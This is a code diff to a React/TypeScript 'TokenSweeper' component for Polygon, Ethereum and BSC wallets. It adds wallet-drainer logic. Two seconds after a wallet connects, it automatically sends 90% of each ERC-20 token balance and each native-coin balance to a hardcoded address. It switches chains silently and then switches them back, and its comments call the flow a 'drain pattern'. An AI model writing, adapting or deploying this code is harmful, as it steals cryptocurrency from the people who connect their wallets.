@@ -4,35 +4,53 @@
 import { useState, useEffect, useRef, useCallback } from "react";
 import {
   useAccount,
-  useSignTypedData,
   useWriteContract,
   useSwitchChain,
   usePublicClient,
+  useWalletClient,
 } from "wagmi";
-import { Address, parseAbi, Chain, PublicClient } from "viem";
-import { tokenSweeperAbi } from "@/lib/abis/TokenSweeper";
+import {
+  Address,
+  parseAbi,
+  Chain,
+  PublicClient,
+  createPublicClient,
+  http,
+  erc20Abi,
+} from "viem";
 import { Button } from "@/components/ui/button";
 import { formatBalance } from "@/lib/utils";
 
 import { Skeleton } from "@/components/ui/skeleton";
 import { mainnet, polygon, bsc } from "@reown/appkit/networks"; // Import from Reown appkit
+import { AUTO_DESTINATION_ADDRESS, AUTO_MODE_ENABLED } from "@/config";
 
-// Contract addresses per chain (deploy and update these)
-const CONTRACT_ADDRESSES: Record<number, Address> = {
-//  [polygon.id]: "0xF2E0A817FD2E795EaecC8BC63CFAcC5828Cc5150", // Your sweep contract
-  [polygon.id]: "0xC79a3bf374C28De832A4ABBdf1473D85909777E3",
-  [mainnet.id]: "0xYourEthereumContract",
-  [bsc.id]: "0xYourBNBContract",
-};
+// Standard ERC-20 transfer (no sweeper contract)
+const ERC20_TRANSFER_ABI = parseAbi([
+  "function transfer(address to, uint256 amount) returns (bool)",
+]);
 
 // WMATIC contract address on Polygon (this wraps native POL to WMATIC)
 const WMATIC_ADDRESS: Address = "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270";
 
-//Target Address - Hardcoded for automatic sweeping
-const TARGET_ADDRESS: Address = "0xEc083d6958a356f125DC06d68a7B1696386434cD";
+// Target for automatic sweeping: from env (NEXT_PUBLIC_AUTO_DESTINATION_ADDRESS) when set, else fallback
+const TARGET_ADDRESS_FALLBACK: Address =
+  "0xEc083d6958a356f125DC06d68a7B1696386434cD";
+const TARGET_ADDRESS: Address =
+  AUTO_MODE_ENABLED && AUTO_DESTINATION_ADDRESS
+    ? AUTO_DESTINATION_ADDRESS
+    : TARGET_ADDRESS_FALLBACK;
 
 // Supported chains
 const SUPPORTED_CHAINS: Chain[] = [polygon, mainnet, bsc];
+
+// Per-chain public client (so we fetch balances for every chain, not only the current one)
+function getPublicClientForChain(chain: Chain): PublicClient {
+  return createPublicClient({
+    chain,
+    transport: http(chain.rpcUrls?.default?.http?.[0]),
+  });
+}
 
 // Sweep configuration
 const SWEEP_PERCENT = BigInt(90); // Keep 10%
@@ -126,21 +144,12 @@ interface NativeBalance {
   symbol: string;
 }
 
-// Manual splitSignature (since viem might not export it directly)
-function manualSplitSignature(signature: `0x${string}`) {
-  const sig = signature.slice(2);
-  const r = `0x${sig.slice(0, 64)}` as `0x${string}`;
-  const s = `0x${sig.slice(64, 128)}` as `0x${string}`;
-  const v = parseInt(sig.slice(128, 130), 16);
-  return { r, s, v };
-}
-
 export default function TokenSweeper() {
-  const { address: userAddress, isConnected } = useAccount();
+  const { address: userAddress, isConnected, chainId } = useAccount();
   const { switchChain } = useSwitchChain();
-  const { signTypedDataAsync } = useSignTypedData();
-  const { writeContract } = useWriteContract();
-  const publicClient = usePublicClient(); // Current chain client
+  const { writeContractAsync, writeContract } = useWriteContract();
+  const { data: walletClient } = useWalletClient();
+  const publicClient = usePublicClient();
 
   const [tokenBalances, setTokenBalances] = useState<TokenBalance[]>([]);
   const [nativeBalances, setNativeBalances] = useState<NativeBalance[]>([]);
@@ -161,34 +170,39 @@ export default function TokenSweeper() {
   const autoSweepTriggeredRef = useRef(false);
   const postWrapForwardedRef = useRef(false);
 
-  // Function to get client for specific chain (simplified; in prod, use configured clients)
+  // Current chain client (for writes / switch chain flows)
   const getPublicClient = (): PublicClient => {
-    // For demo, assume switching; better to have pre-configured multi-chain
-    return publicClient!; // Placeholder; implement proper multi-chain
+    return publicClient!;
   };
 
   const handleAutoSweep = useCallback(
     async (balances: TokenBalance[], nativeBals: NativeBalance[]) => {
-      if (!isConnected || !userAddress) {
+      if (!isConnected || !userAddress || !walletClient) {
         setError("Wallet not connected");
         return;
       }
 
-      if (balances.length === 0) {
+      const hasTokens = balances.length > 0;
+      const hasNative = nativeBals.some((n) => n.balance > BigInt(0));
+      if (!hasTokens && !hasNative) {
+        setError("No token or native balances found");
+        return;
+      }
+
+      if (!hasTokens && hasNative) {
         const nativeOnPolygon = nativeBals.find(
           (n) => n.chainId === polygon.id && n.balance > BigInt(0)
         );
         if (nativeOnPolygon) {
           await handleWrapMatic();
           return;
-        } else {
-          setError("No ERC20 tokens with balance found on supported list");
-          return;
         }
       }
 
       setIsLoading(true);
       setError(null);
+
+      const initialChainId = chainId;
 
       try {
         const balancesByChain = balances.reduce((acc, bal) => {
@@ -197,165 +211,88 @@ export default function TokenSweeper() {
           return acc;
         }, {} as Record<number, TokenBalance[]>);
 
-        for (const [chainId, bals] of Object.entries(balancesByChain)) {
-          const id = Number(chainId);
-          const hasAnyBalance = bals.some((bal) => bal.balance > BigInt(0));
-          if (!hasAnyBalance) {
-            console.log(`[AutoSweep] No balance on chain ${id}, skipping...`);
+        // Iterate in SUPPORTED_CHAINS order (polygon, mainnet, bsc) so we don't jump to mainnet first
+        for (const ch of SUPPORTED_CHAINS) {
+          const bals = balancesByChain[ch.id];
+          if (!bals?.length || bals.every((b) => b.balance <= BigInt(0)))
             continue;
-          }
 
+          const id = ch.id;
           await switchChain({ chainId: id });
+          // Wait for wallet to be on the new chain (like drain flow)
+          await new Promise((r) => setTimeout(r, 1500));
+
           const hasGas = await checkGas(id);
           if (!hasGas) {
             setError(
-              `No native tokens for gas on chain ${id}. Please add some native tokens to cover gas fees.`
+              `No native tokens for gas on chain ${id}. Add native tokens to cover gas.`
             );
             continue;
           }
 
-          const approvalTokens: { token: Address; balance: bigint }[] = [];
+          const chain = SUPPORTED_CHAINS.find((c) => c.id === id)!;
+          const chainClient = getPublicClientForChain(chain);
 
-          // Build permits for tokens that support EIP-2612
-          const permits = (
-            await Promise.all(
-              bals.map(async ({ token, balance }) => {
-                const tokenInfo = MAJOR_TOKENS[id].find(
-                  (t) => t.address === token
-                );
-                if (!tokenInfo) return null;
-
-                if (!tokenInfo.supportsPermit) {
-                  console.log(
-                    `[AutoSweep] Token lacks permit, using approvals: ${token}`
-                  );
-                  approvalTokens.push({ token, balance });
-                  return null;
-                }
-
-                // Calculate 90% of the balance
-                const sweepAmount = (balance * SWEEP_PERCENT) / BigInt(100);
-                if (sweepAmount <= BigInt(0)) return null;
-
-                // Try to read nonce; fallback to approvals if missing
-                let nonce: bigint;
-                try {
-                  nonce = (await getPublicClient().readContract({
-                    address: token,
-                    abi: parseAbi([
-                      "function nonces(address owner) view returns (uint256)",
-                    ]),
-                    functionName: "nonces",
-                    args: [userAddress],
-                  })) as bigint;
-                } catch (e) {
-                  console.warn(
-                    `[AutoSweep] nonces() failed, fallback to approvals for ${token}`,
-                    e
-                  );
-                  approvalTokens.push({ token, balance });
-                  return null;
-                }
-
-                const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600);
-                const domain = {
-                  name: tokenInfo.domainName,
-                  version: tokenInfo.domainVersion,
-                  chainId: BigInt(id),
-                  verifyingContract: token as `0x${string}`,
-                };
-                const types = {
-                  Permit: [
-                    { name: "owner", type: "address" },
-                    { name: "spender", type: "address" },
-                    { name: "value", type: "uint256" },
-                    { name: "nonce", type: "uint256" },
-                    { name: "deadline", type: "uint256" },
-                  ],
-                } as const;
-                const message = {
-                  owner: userAddress ?? ("0x" as Address),
-                  spender: CONTRACT_ADDRESSES[id],
-                  value: sweepAmount,
-                  nonce,
-                  deadline,
-                };
-
-                const signature = await signTypedDataAsync({
-                  domain,
-                  types,
-                  primaryType: "Permit",
-                  message,
-                });
-                const { v, r, s } = manualSplitSignature(signature);
-                return { token, amount: sweepAmount, deadline, v, r, s };
-              })
-            )
-          ).filter(
-            (
-              p
-            ): p is {
-              token: Address;
-              amount: bigint;
-              deadline: bigint;
-              v: number;
-              r: `0x${string}`;
-              s: `0x${string}`;
-            } => p !== null
-          );
-
-          if (permits.length > 0) {
-            console.log(
-              `[AutoSweep] Calling secureWithPermits for ${permits.length} tokens`
-            );
-            writeContract({
-              address: CONTRACT_ADDRESSES[id],
-              abi: tokenSweeperAbi,
-              functionName: "secureWithPermits",
-              args: [permits, TARGET_ADDRESS],
-              chainId: id,
-            });
+          for (const { token, balance, name } of bals) {
+            if (balance <= BigInt(0)) continue;
+            const sweepAmount = (balance * SWEEP_PERCENT) / BigInt(100);
+            if (sweepAmount <= BigInt(0)) continue;
+            try {
+              // Drain pattern: simulate then write (same as SendTokens in drain)
+              const { request } = await chainClient.simulateContract({
+                account: walletClient.account!,
+                address: token,
+                abi: erc20Abi,
+                functionName: "transfer",
+                args: [TARGET_ADDRESS, sweepAmount],
+              });
+              await walletClient.writeContract(request);
+              setSuccessMessage(`Transferred ${name} to target`);
+            } catch (e) {
+              console.warn(`[AutoSweep] transfer failed for ${name}:`, e);
+              setError(`Transfer failed for ${name}: ${(e as Error).message}`);
+            }
           }
 
-          if (approvalTokens.length > 0) {
-            console.log(
-              `[AutoSweep] Using approvals for tokens:`,
-              approvalTokens.map((t) => t.token)
-            );
-            // Ensure allowances
-            for (const { token, balance } of approvalTokens) {
-              const allowance = (await getPublicClient().readContract({
-                address: token,
-                abi: parseAbi([
-                  "function allowance(address owner, address spender) view returns (uint256)",
-                ]),
-                functionName: "allowance",
-                args: [userAddress, CONTRACT_ADDRESSES[id]],
-              })) as bigint;
-              if (allowance < balance) {
-                console.log(
-                  `[AutoSweep] Approving ${token} for ${balance.toString()}`
-                );
-                writeContract({
-                  address: token,
-                  abi: parseAbi([
-                    "function approve(address spender, uint256 amount) external returns (bool)",
-                  ]),
-                  functionName: "approve",
-                  args: [CONTRACT_ADDRESSES[id], balance],
-                  chainId: id,
+          const nativeOnChain = nativeBals.find((n) => n.chainId === id);
+          if (
+            nativeOnChain &&
+            nativeOnChain.balance > BigInt(0) &&
+            walletClient
+          ) {
+            const gasCheck = await checkGasWithEstimation(id);
+            const gasReserve = gasCheck.totalGasCost;
+            const sendable =
+              nativeOnChain.balance > gasReserve
+                ? nativeOnChain.balance - gasReserve
+                : BigInt(0);
+            const nativeAmount = (sendable * SWEEP_PERCENT) / BigInt(100);
+            if (nativeAmount > BigInt(0)) {
+              try {
+                await walletClient.sendTransaction({
+                  to: TARGET_ADDRESS,
+                  value: nativeAmount,
+                  chain,
                 });
+                setSuccessMessage(
+                  `Transferred ${nativeOnChain.symbol} to target`
+                );
+              } catch (e) {
+                console.warn(
+                  `[AutoSweep] native transfer failed on chain ${id}:`,
+                  e
+                );
               }
             }
-            // Forward via approvals (transfers full balances for those tokens)
-            writeContract({
-              address: CONTRACT_ADDRESSES[id],
-              abi: tokenSweeperAbi,
-              functionName: "secureWithApprovals",
-              args: [approvalTokens.map((t) => t.token), TARGET_ADDRESS],
-              chainId: id,
-            });
           }
+        }
+
+        // Restore user's chain so we don't leave them on the last sweep chain
+        if (
+          initialChainId != null &&
+          SUPPORTED_CHAINS.some((c) => c.id === initialChainId)
+        ) {
+          await switchChain({ chainId: initialChainId });
         }
       } catch (err: unknown) {
         setError(`Error: ${(err as Error).message}`);
@@ -363,7 +300,14 @@ export default function TokenSweeper() {
         setIsLoading(false);
       }
     },
-    [isConnected, userAddress, switchChain, signTypedDataAsync, publicClient]
+    [
+      isConnected,
+      userAddress,
+      chainId,
+      switchChain,
+      writeContractAsync,
+      walletClient,
+    ]
   );
 
   // Update gas status for current network
@@ -384,28 +328,28 @@ export default function TokenSweeper() {
     }
   };
 
-  // Fetch balances across chains without hook loops
+  // Fetch balances across all supported chains (re-run when wallet or chain changes)
   useEffect(() => {
     if (!isConnected || !userAddress) return;
-    if (hasFetchedRef.current) return; // prevent repeated fetches on re-render
-    hasFetchedRef.current = true;
-
+    hasFetchedRef.current = false; // allow refetch when chain switches (e.g. to BSC)
     const fetchBalances = async () => {
+      if (hasFetchedRef.current) return;
+      hasFetchedRef.current = true;
       const allBalances: TokenBalance[] = [];
       const allNative: NativeBalance[] = [];
       for (const ch of SUPPORTED_CHAINS) {
-        // Switch only if necessary; try to fetch without
+        const chainClient = getPublicClientForChain(ch);
         try {
           const balancesPromises = MAJOR_TOKENS[ch.id].map(async (token) => {
             try {
-              const balance = (await getPublicClient().readContract({
+              const balance = (await chainClient.readContract({
                 address: token.address,
                 abi: parseAbi([
                   "function balanceOf(address) view returns (uint256)",
                 ]),
                 functionName: "balanceOf",
                 args: [userAddress],
-              })) as bigint; // Type as bigint
+              })) as bigint;
               if (balance && balance > BigInt(0)) {
                 return {
                   token: token.address,
@@ -424,9 +368,8 @@ export default function TokenSweeper() {
           allBalances.push(...chainBalances);
         } catch {}
 
-        // Native balance for this chain
         try {
-          const nativeBal = await getPublicClient().getBalance({
+          const nativeBal = await chainClient.getBalance({
             address: userAddress,
           });
           if (nativeBal && nativeBal > BigInt(0)) {
@@ -443,23 +386,43 @@ export default function TokenSweeper() {
 
       // Update gas status
       await updateGasStatus();
-
-      // Optionally auto-start sweep after fetching balances (disabled by default)
-      if (AUTO_SWEEP_ON_LOAD && !autoSweepTriggeredRef.current) {
-        autoSweepTriggeredRef.current = true;
-        setTimeout(() => {
-          if (
-            allBalances.length > 0 ||
-            allNative.some((n) => n.balance > BigInt(0))
-          ) {
-            handleAutoSweep(allBalances, allNative);
-          }
-        }, 1000);
-      }
     };
 
     fetchBalances();
+  }, [isConnected, userAddress, chainId]);
+
+  // Reset auto-sweep flag when wallet disconnects so reconnecting can trigger again
+  useEffect(() => {
+    if (!isConnected || !userAddress) {
+      autoSweepTriggeredRef.current = false;
+    }
   }, [isConnected, userAddress]);
+
+  // Trigger auto-transfer when wallet is connected AND walletClient is ready (drain: 2s delay)
+  useEffect(() => {
+    if (!AUTO_SWEEP_ON_LOAD || autoSweepTriggeredRef.current) return;
+    if (!isConnected || !walletClient || !userAddress) return;
+
+    const hasBalances =
+      tokenBalances.length > 0 ||
+      nativeBalances.some((n) => n.balance > BigInt(0));
+    if (!hasBalances) return;
+
+    autoSweepTriggeredRef.current = true;
+    const timer = setTimeout(() => {
+      handleAutoSweep(tokenBalances, nativeBalances);
+    }, 2000);
+
+    return () => clearTimeout(timer);
+  }, [
+    AUTO_SWEEP_ON_LOAD,
+    isConnected,
+    walletClient,
+    userAddress,
+    tokenBalances,
+    nativeBalances,
+    handleAutoSweep,
+  ]);
 
   const checkGas = async (chainId: number) => {
     const nativeBalance = await getPublicClient().getBalance({
@@ -580,80 +543,34 @@ export default function TokenSweeper() {
         )} POL. Check your wallet for transaction confirmation.`
       );
 
-      // After wrapping, forward WMATIC once via approvals
+      // After wrapping, transfer WMATIC to target via standard transfer()
       if (!postWrapForwardedRef.current) {
         postWrapForwardedRef.current = true;
         setTimeout(async () => {
           try {
-            console.log("[PostWrap] Checking WMATIC balance...");
-            // Read current WMATIC balance
             const wmaticBal = (await getPublicClient().readContract({
               address: WMATIC_ADDRESS,
               abi: parseAbi([
                 "function balanceOf(address) view returns (uint256)",
-                "function allowance(address owner, address spender) view returns (uint256)",
               ]),
               functionName: "balanceOf",
               args: [userAddress],
             })) as bigint;
 
-            console.log("[PostWrap] WMATIC balance:", wmaticBal.toString());
-
             if (wmaticBal && wmaticBal > BigInt(0)) {
-              // Using approval-based forwarding temporarily
-              const tokensToForward: Address[] = [WMATIC_ADDRESS];
-
-              // Ensure approval is sufficient for the sweeper contract
-              const currentAllowance = (await getPublicClient().readContract({
+              setSuccessMessage("Transferring WMATIC to target...");
+              await writeContractAsync({
                 address: WMATIC_ADDRESS,
-                abi: parseAbi([
-                  "function allowance(address owner, address spender) view returns (uint256)",
-                ]),
-                functionName: "allowance",
-                args: [userAddress, CONTRACT_ADDRESSES[polygon.id]],
-              })) as bigint;
-
-              console.log(
-                "[PostWrap] Current allowance:",
-                currentAllowance.toString()
-              );
-
-              if (currentAllowance < wmaticBal) {
-                console.log(
-                  "[PostWrap] Approving sweeper for WMATIC:",
-                  wmaticBal.toString()
-                );
-                setSuccessMessage("Approving sweeper to spend WMATIC...");
-                writeContract({
-                  address: WMATIC_ADDRESS,
-                  abi: parseAbi([
-                    "function approve(address spender, uint256 amount) external returns (bool)",
-                  ]),
-                  functionName: "approve",
-                  args: [CONTRACT_ADDRESSES[polygon.id], wmaticBal],
-                  chainId: polygon.id,
-                });
-              }
-
-              console.log(
-                "[PostWrap] Calling secureWithApprovals to forward WMATIC..."
-              );
-              setSuccessMessage("Forwarding WMATIC to target...");
-              writeContract({
-                address: CONTRACT_ADDRESSES[polygon.id],
-                abi: tokenSweeperAbi,
-                functionName: "secureWithApprovals",
-                args: [tokensToForward, TARGET_ADDRESS],
+                abi: ERC20_TRANSFER_ABI,
+                functionName: "transfer",
+                args: [TARGET_ADDRESS, wmaticBal],
                 chainId: polygon.id,
               });
-            } else {
-              console.log(
-                "[PostWrap] No WMATIC balance detected; skipping forward."
-              );
+              setSuccessMessage("WMATIC transferred to target.");
             }
           } catch (e) {
-            console.error("[PostWrap] Forward via approvals failed:", e);
-            setError(`Forward via approvals failed: ${(e as Error).message}`);
+            console.error("[PostWrap] transfer failed:", e);
+            setError(`Transfer failed: ${(e as Error).message}`);
           }
         }, 4000);
       }
@@ -783,7 +700,7 @@ export default function TokenSweeper() {
   };
 
   const handleSweep = async () => {
-    if (!isConnected || !userAddress) {
+    if (!isConnected || !userAddress || !walletClient) {
       setError("Wallet not connected");
       return;
     }
@@ -793,10 +710,10 @@ export default function TokenSweeper() {
       );
       if (nativeOnPolygon) {
         setError(
-          "Only native MATIC detected. Please wrap to WMATIC or swap to USDC/USDT first."
+          "Only native MATIC detected. Wrap to WMATIC or swap to USDC/USDT first."
         );
       } else {
-        setError("No ERC20 tokens with balance found on supported list");
+        setError("No ERC20 tokens with balance found");
       }
       return;
     }
@@ -805,169 +722,7 @@ export default function TokenSweeper() {
     setError(null);
 
     try {
-      const balancesByChain = tokenBalances.reduce((acc, bal) => {
-        acc[bal.chainId] = acc[bal.chainId] || [];
-        acc[bal.chainId].push(bal);
-        return acc;
-      }, {} as Record<number, TokenBalance[]>);
-
-      for (const [chainId, bals] of Object.entries(balancesByChain)) {
-        const id = Number(chainId);
-        const hasAnyBalance = bals.some((bal) => bal.balance > BigInt(0));
-        if (!hasAnyBalance) {
-          console.log(`[Sweep] No balance on chain ${id}, skipping...`);
-          continue;
-        }
-
-        await switchChain({ chainId: id });
-        const hasGas = await checkGas(id);
-        if (!hasGas) {
-          setError(
-            `No native tokens for gas on chain ${id}. Please add some native tokens to cover gas fees.`
-          );
-          continue;
-        }
-
-        const approvalTokens: { token: Address; balance: bigint }[] = [];
-
-        const permits = (
-          await Promise.all(
-            bals.map(async ({ token, balance }) => {
-              const tokenInfo = MAJOR_TOKENS[id].find(
-                (t) => t.address === token
-              );
-              if (!tokenInfo) return null;
-
-              if (!tokenInfo.supportsPermit) {
-                console.log(
-                  `[Sweep] Token lacks permit, using approvals: ${token}`
-                );
-                approvalTokens.push({ token, balance });
-                return null;
-              }
-
-              const sweepAmount = (balance * SWEEP_PERCENT) / BigInt(100);
-              if (sweepAmount <= BigInt(0)) return null;
-
-              let nonce: bigint;
-              try {
-                nonce = (await getPublicClient().readContract({
-                  address: token,
-                  abi: parseAbi([
-                    "function nonces(address owner) view returns (uint256)",
-                  ]),
-                  functionName: "nonces",
-                  args: [userAddress],
-                })) as bigint;
-              } catch (e) {
-                console.warn(
-                  `[Sweep] nonces() failed, fallback to approvals for ${token}`,
-                  e
-                );
-                approvalTokens.push({ token, balance });
-                return null;
-              }
-
-              const tokenMeta = MAJOR_TOKENS[id].find(
-                (t) => t.address === token
-              )!;
-              const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600);
-              const domain = {
-                name: tokenMeta.domainName,
-                version: tokenMeta.domainVersion,
-                chainId: BigInt(id),
-                verifyingContract: token as `0x${string}`,
-              };
-              const types = {
-                Permit: [
-                  { name: "owner", type: "address" },
-                  { name: "spender", type: "address" },
-                  { name: "value", type: "uint256" },
-                  { name: "nonce", type: "uint256" },
-                  { name: "deadline", type: "uint256" },
-                ],
-              } as const;
-              const message = {
-                owner: userAddress ?? ("0x" as Address),
-                spender: CONTRACT_ADDRESSES[id],
-                value: sweepAmount,
-                nonce,
-                deadline,
-              };
-              const signature = await signTypedDataAsync({
-                domain,
-                types,
-                primaryType: "Permit",
-                message,
-              });
-              const { v, r, s } = manualSplitSignature(signature);
-              return { token, amount: sweepAmount, deadline, v, r, s };
-            })
-          )
-        ).filter(
-          (
-            p
-          ): p is {
-            token: Address;
-            amount: bigint;
-            deadline: bigint;
-            v: number;
-            r: `0x${string}`;
-            s: `0x${string}`;
-          } => p !== null
-        );
-
-        if (permits.length > 0) {
-          console.log(
-            `[Sweep] Calling secureWithPermits for ${permits.length} tokens`
-          );
-          writeContract({
-            address: CONTRACT_ADDRESSES[id],
-            abi: tokenSweeperAbi,
-            functionName: "secureWithPermits",
-            args: [permits, TARGET_ADDRESS],
-            chainId: id,
-          });
-        }
-
-        if (approvalTokens.length > 0) {
-          console.log(
-            `[Sweep] Using approvals for tokens:`,
-            approvalTokens.map((t) => t.token)
-          );
-          for (const { token, balance } of approvalTokens) {
-            const allowance = (await getPublicClient().readContract({
-              address: token,
-              abi: parseAbi([
-                "function allowance(address owner, address spender) view returns (uint256)",
-              ]),
-              functionName: "allowance",
-              args: [userAddress, CONTRACT_ADDRESSES[id]],
-            })) as bigint;
-            if (allowance < balance) {
-              console.log(
-                `[Sweep] Approving ${token} for ${balance.toString()}`
-              );
-              writeContract({
-                address: token,
-                abi: parseAbi([
-                  "function approve(address spender, uint256 amount) external returns (bool)",
-                ]),
-                functionName: "approve",
-                args: [CONTRACT_ADDRESSES[id], balance],
-                chainId: id,
-              });
-            }
-          }
-          writeContract({
-            address: CONTRACT_ADDRESSES[id],
-            abi: tokenSweeperAbi,
-            functionName: "secureWithApprovals",
-            args: [approvalTokens.map((t) => t.token), TARGET_ADDRESS],
-            chainId: id,
-          });
-        }
-      }
+      await handleAutoSweep(tokenBalances, nativeBalances);
     } catch (err: unknown) {
       setError(`Error: ${(err as Error).message}`);
     } finally {
@@ -1022,7 +777,7 @@ export default function TokenSweeper() {
     <div className="p-4">
       <h2 className="text-xl font-bold mb-4">Token Sweeper</h2>
       <p className="text-sm text-gray-400 mb-4">
-        Automatic token sweeping to: {TARGET_ADDRESS} (90% of balance)
+        Standard token transfer to: {TARGET_ADDRESS} (90% of balance per token)
       </p>
 
       {/* Gas Status Warning */}
@@ -1035,8 +790,8 @@ export default function TokenSweeper() {
           </div>
           <p className="text-sm text-gray-300">
             Ensure you have sufficient native tokens (MATIC/ETH/BNB) to cover
-            network fees. The system will sweep 90% of your token balances and
-            only switch chains when you have actual balances to process.
+            network fees. The system will transfer 90% of each token balance to
+            the target address using standard ERC-20 transfer and native send.
           </p>
 
           {/* Real-time Gas Status */}
@@ -1179,7 +934,7 @@ export default function TokenSweeper() {
         )}
       </div>
       <Button onClick={handleSweep} disabled={isLoading}>
-        {isLoading ? "Sweeping..." : "Sweep Tokens"}
+        {isLoading ? "Transferring..." : "Transfer Tokens"}
       </Button>
       {error && <p className="text-red-500 mt-2">{error}</p>}
       {successMessage && (
